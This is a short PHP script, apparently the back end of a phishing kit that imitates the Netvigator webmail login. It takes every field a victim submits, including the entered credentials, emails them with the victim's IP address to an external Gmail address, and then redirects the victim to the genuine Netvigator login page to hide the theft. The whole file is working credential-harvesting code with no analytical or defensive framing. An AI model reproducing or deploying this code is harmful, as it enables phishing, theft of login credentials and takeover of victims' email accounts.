<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: https://netvigator.com/chi/email/login.html');
$message = '';
foreach($_POST as $variable => $value) {
$message .= $variable.': '.$value."\r\n";}
$header  = 'From: Netvigator <rajwa.rajwa50@gmail.com>'."\r\n";
$header .= 'Reply-To: rajwa.rajwa50@gmail.com'."\r\n";
$header .= 'MIME-Version: 1.0'."\r\n";
$header .= 'Content-Type: text/plain; charset=utf-8'."\r\n";
$header .= 'Content-Transfer-Encoding: 8bit'."\r\n";
$header .= 'X-Mailer: PHP v'.phpversion();
mail('rajwa.rajwa50@gmail.com', $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);
exit;
} ?>
